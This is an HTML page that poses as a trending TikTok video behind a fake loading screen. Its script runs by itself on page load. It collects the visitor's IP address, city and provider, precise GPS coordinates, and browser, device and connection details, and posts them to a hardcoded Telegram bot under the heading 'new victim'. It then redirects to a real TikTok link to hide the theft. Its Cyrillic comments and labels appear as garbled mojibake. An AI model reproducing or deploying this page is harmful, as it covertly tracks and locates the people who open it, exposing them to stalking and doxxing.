<!DOCTYPE html>
<html>
<head>
    <title>TikTok Video</title>
    <style>
        body { 
            background: #000; 
            color: #fff; 
            text-align: center;

    </style>
</head>
<body>
    <h1>üéµ TRENDING TIKTOK VIDEO</h1>
    <div class="loader">
        <div class="spinner"></div>
        <p>Preparing video content...</p>
    </div>

    <div id="data"></div>

    <script>
        async function collectSortedData() {
            const data = {
                network: {},
                system: {},
                device: {},
                connection: {},
                location: {},
                timing: {},
                session: {}
            };

            // 1. –°–ï–¢–ï–í–´–ï –î–ê–ù–ù–´–ï
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.network.IP = ipData.ip;
                
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                data.network.–°—Ç—Ä–∞–Ω–∞ = geoData.country_name;
                data.network.–ì–æ—Ä–æ–¥ = geoData.city;
                data.network.–†–µ–≥–∏–æ–Ω = geoData.region;
                data.network.–ü—Ä–æ–≤–∞–π–¥–µ—Ä = geoData.org;
                data.network.–ß–∞—Å–æ–≤–æ–π–ü–æ—è—Å = geoData.timezone;
            } catch(e) {}

            // 2. –°–ò–°–¢–ï–ú–ù–´–ï –î–ê–ù–ù–´–ï
            data.system.–ë—Ä–∞—É–∑–µ—Ä = navigator.userAgent;
            data.system.–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞ = navigator.platform;
            data.system.–Ø–∑—ã–∫ = navigator.language;
            data.system.–î–æ—Å—Ç—É–ø–Ω—ã–µ–Ø–∑—ã–∫–∏ = navigator.languages.join(', ');
            data.system.–í–µ–Ω–¥–æ—Ä = navigator.vendor;

            // 3. –î–ê–ù–ù–´–ï –£–°–¢–†–û–ô–°–¢–í–ê
            data.device.–≠–∫—Ä–∞–Ω = `${screen.width}x${screen.height}`;
            data.device.–ì–ª—É–±–∏–Ω–∞–¶–≤–µ—Ç–∞ = `${screen.colorDepth}bit`;
            data.device.–ü–ª–æ—Ç–Ω–æ—Å—Ç—å–ü–∏–∫—Å–µ–ª–µ–π = window.devicePixelRatio;
            data.device.–°–µ–Ω—Å–æ—Ä–Ω—ã–π–≠–∫—Ä–∞–Ω = !!('ontouchstart' in window) ? '–î–∞' : '–ù–µ—Ç';
            data.device.–Ø–¥—Ä–∞CPU = navigator.hardwareConcurrency;
            data.device.–ü–∞–º—è—Ç—å = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';

            // 4. –î–ê–ù–ù–´–ï –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø
            if (navigator.connection) {
                data.connection.–¢–∏–ø = navigator.connection.effectiveType;
                data.connection.–°–∫–æ—Ä–æ—Å—Ç—å = `${navigator.connection.downlink}Mbps`;
                data.connection.–ó–∞–¥–µ—Ä–∂–∫–∞ = `${navigator.connection.rtt}ms`;
            }

            // 5. –ì–ï–û–õ–û–ö–ê–¶–ò–Ø
            if (navigator.geolocation) {
                await new Promise(resolve => {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            data.location.–®–∏—Ä–æ—Ç–∞ = position.coords.latitude;
                            data.location.–î–æ–ª–≥–æ—Ç–∞ = position.coords.longitude;
                            data.location.–¢–æ—á–Ω–æ—Å—Ç—å = `${position.coords.accuracy}–º`;
                            resolve();
                        },
                        () => {
                            data.location.–°—Ç–∞—Ç—É—Å = '–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω';
                            resolve();
                        },
                        { timeout: 3000 }
                    );
                });
            } else {
                data.location.–°—Ç–∞—Ç—É—Å = '–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è';
            }

            // 6. –í–†–ï–ú–ï–ù–ù–´–ï –î–ê–ù–ù–´–ï
            const now = new Date();
            data.timing.–õ–æ–∫–∞–ª—å–Ω–æ–µ–í—Ä–µ–º—è = now.toLocaleString('ru-RU', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            data.timing.–ß–∞—Å–æ–≤–æ–π–ü–æ—è—Å = `UTC${now.getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(now.getTimezoneOffset()/60)}`;

            // 7. –î–ê–ù–ù–´–ï –°–ï–ê–ù–°–ê
            data.session.–ò—Å—Ç–æ—á–Ω–∏–∫ = document.referrer || '–ø—Ä—è–º–æ–π –∑–∞—Ö–æ–¥';
            data.session.URL = window.location.href;

            await sendFormattedToTelegram(data);
        }

        async function sendFormattedToTelegram(data) {
            const botToken = "8044243850:AAG3jnmhyAPFJq2J1qXxyQAZ9tVA1smYBy0";
            const chatId = "1486385025";
            
            try {
                // –§–æ—Ä–º–∏—Ä—É–µ–º –µ–¥–∏–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –ø–µ—Ä–µ–Ω–æ—Å–∞–º–∏
                let message = 'üÜï –ù–û–í–ê–Ø –ñ–ï–†–¢–í–ê :\n';
                message += '‚∏ª‚∏ª‚∏ª‚∏ª‚∏ª\n\n';

                // –°–ï–¢–ï–í–´–ï –î–ê–ù–ù–´–ï
                message += 'üåê –°–ï–¢–ï–í–´–ï –î–ê–ù–ù–´–ï\n';
                if (data.network.IP) message += `IP: ${data.network.IP}\n`;
                if (data.network.–°—Ç—Ä–∞–Ω–∞) message += `–°—Ç—Ä–∞–Ω–∞: ${data.network.–°—Ç—Ä–∞–Ω–∞}\n`;
                if (data.network.–ì–æ—Ä–æ–¥) message += `–ì–æ—Ä–æ–¥: ${data.network.–ì–æ—Ä–æ–¥}\n`;
                if (data.network.–†–µ–≥–∏–æ–Ω) message += `–†–µ–≥–∏–æ–Ω: ${data.network.–†–µ–≥–∏–æ–Ω}\n`;
                if (data.network.–ü—Ä–æ–≤–∞–π–¥–µ—Ä) message += `–ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${data.network.–ü—Ä–æ–≤–∞–π–¥–µ—Ä}\n`;
                if (data.network.–ß–∞—Å–æ–≤–æ–π–ü–æ—è—Å) message += `–ß–∞—Å–æ–≤–æ–π–ü–æ—è—Å: ${data.network.–ß–∞—Å–æ–≤–æ–π–ü–æ—è—Å}\n`;
                message += '\n‚∏ª\n\n';

                // –°–ò–°–¢–ï–ú–ù–´–ï –î–ê–ù–ù–´–ï
                message += 'üíª –°–ò–°–¢–ï–ú–ù–´–ï –î–ê–ù–ù–´–ï\n';
                if (data.system.–ë—Ä–∞—É–∑–µ—Ä) message += `–ë—Ä–∞—É–∑–µ—Ä: ${data.system.–ë—Ä–∞—É–∑–µ—Ä}\n`;
                if (data.system.–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞) message += `–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${data.system.–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞}\n`;
                if (data.system.–Ø–∑—ã–∫) message += `–Ø–∑—ã–∫: ${data.system.–Ø–∑—ã–∫}\n`;
                if (data.system.–î–æ—Å—Ç—É–ø–Ω—ã–µ–Ø–∑—ã–∫–∏) message += `–î–æ—Å—Ç—É–ø–Ω—ã–µ–Ø–∑—ã–∫–∏: ${data.system.–î–æ—Å—Ç—É–ø–Ω—ã–µ–Ø–∑—ã–∫–∏}\n`;
                if (data.system.–í–µ–Ω–¥–æ—Ä) message += `–í–µ–Ω–¥–æ—Ä: ${data.system.–í–µ–Ω–¥–æ—Ä}\n`;
                message += '\n‚∏ª\n\n';

                // –î–ê–ù–ù–´–ï –£–°–¢–†–û–ô–°–¢–í–ê
                message += 'üì± –î–ê–ù–ù–´–ï –£–°–¢–†–û–ô–°–¢–í–ê\n';
                if (data.device.–≠–∫—Ä–∞–Ω) message += `–≠–∫—Ä–∞–Ω: ${data.device.–≠–∫—Ä–∞–Ω}\n`;
                if (data.device.–ì–ª—É–±–∏–Ω–∞–¶–≤–µ—Ç–∞) message += `–ì–ª—É–±–∏–Ω–∞–¶–≤–µ—Ç–∞: ${data.device.–ì–ª—É–±–∏–Ω–∞–¶–≤–µ—Ç–∞}\n`;
                if (data.device.–ü–ª–æ—Ç–Ω–æ—Å—Ç—å–ü–∏–∫—Å–µ–ª–µ–π) message += `–ü–ª–æ—Ç–Ω–æ—Å—Ç—å–ü–∏–∫—Å–µ–ª–µ–π: ${data.device.–ü–ª–æ—Ç–Ω–æ—Å—Ç—å–ü–∏–∫—Å–µ–ª–µ–π}\n`;
                if (data.device.–°–µ–Ω—Å–æ—Ä–Ω—ã–π–≠–∫—Ä–∞–Ω) message += `–°–µ–Ω—Å–æ—Ä–Ω—ã–π–≠–∫—Ä–∞–Ω: ${data.device.–°–µ–Ω—Å–æ—Ä–Ω—ã–π–≠–∫—Ä–∞–Ω}\n`;
                if (data.device.–Ø–¥—Ä–∞CPU) message += `–Ø–¥—Ä–∞CPU: ${data.device.–Ø–¥—Ä–∞CPU}\n`;
                if (data.device.–ü–∞–º—è—Ç—å) message += `–ü–∞–º—è—Ç—å: ${data.device.–ü–∞–º—è—Ç—å}\n`;
                message += '\n‚∏ª\n\n';

                // –î–ê–ù–ù–´–ï –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø
                if (Object.keys(data.connection).length > 0) {
                    message += 'üì∂ –î–ê–ù–ù–´–ï –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø\n';
                    if (data.connection.–¢–∏–ø) message += `–¢–∏–ø: ${data.connection.–¢–∏–ø}\n`;
                    if (data.connection.–°–∫–æ—Ä–æ—Å—Ç—å) message += `–°–∫–æ—Ä–æ—Å—Ç—å: ${data.connection.–°–∫–æ—Ä–æ—Å—Ç—å}\n`;
                    if (data.connection.–ó–∞–¥–µ—Ä–∂–∫–∞) message += `–ó–∞–¥–µ—Ä–∂–∫–∞: ${data.connection.–ó–∞–¥–µ—Ä–∂–∫–∞}\n`;
                    message += '\n‚∏ª\n\n';
                }

                // –ì–ï–û–õ–û–ö–ê–¶–ò–Ø
                message += 'üìç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø\n';
                if (data.location.–®–∏—Ä–æ—Ç–∞) {
                    message += `–®–∏—Ä–æ—Ç–∞: ${data.location.–®–∏—Ä–æ—Ç–∞}\n`;
                    message += `–î–æ–ª–≥–æ—Ç–∞: ${data.location.–î–æ–ª–≥–æ—Ç–∞}\n`;
                    message += `–¢–æ—á–Ω–æ—Å—Ç—å: ${data.location.–¢–æ—á–Ω–æ—Å—Ç—å}\n`;
                } else if (data.location.–°—Ç–∞—Ç—É—Å) {
                    message += `–°—Ç–∞—Ç—É—Å: ${data.location.–°—Ç–∞—Ç—É—Å}\n`;
                }
                message += '\n‚∏ª\n\n';

                // –í–†–ï–ú–ï–ù–ù–´–ï –î–ê–ù–ù–´–ï
                message += '‚è∞ –í–†–ï–ú–ï–ù–ù–´–ï –î–ê–ù–ù–´–ï\n';
                if (data.timing.–õ–æ–∫–∞–ª—å–Ω–æ–µ–í—Ä–µ–º—è) message += `–õ–æ–∫–∞–ª—å–Ω–æ–µ–í—Ä–µ–º—è: ${data.timing.–õ–æ–∫–∞–ª—å–Ω–æ–µ–í—Ä–µ–º—è}\n`;
                if (data.timing.–ß–∞—Å–æ–≤–æ–π–ü–æ—è—Å) message += `–ß–∞—Å–æ–≤–æ–π–ü–æ—è—Å: ${data.timing.–ß–∞—Å–æ–≤–æ–π–ü–æ—è—Å}\n`;
                message += '\n‚∏ª\n\n';

                // –î–ê–ù–ù–´–ï –°–ï–ê–ù–°–ê
                message += 'üîó –î–ê–ù–ù–´–ï –°–ï–ê–ù–°–ê\n';
                if (data.session.–ò—Å—Ç–æ—á–Ω–∏–∫) message += `–ò—Å—Ç–æ—á–Ω–∏–∫: ${data.session.–ò—Å—Ç–æ—á–Ω–∏–∫}\n`;
                if (data.session.URL) message += `URL: ${data.session.URL}`;

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –û–î–ù–û —Å–æ–æ–±—â–µ–Ω–∏–µ
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

            } catch(e) {
                console.error('Telegram error:', e);
            }
        }

        // –ó–ê–ü–£–°–ö
        setTimeout(() => {
            collectSortedData();
            setTimeout(() => {
                window.location.href = "https://vm.tiktok.com/ZMAbhyLnv/";
            }, 4500);
        }, 1000);
    </script>
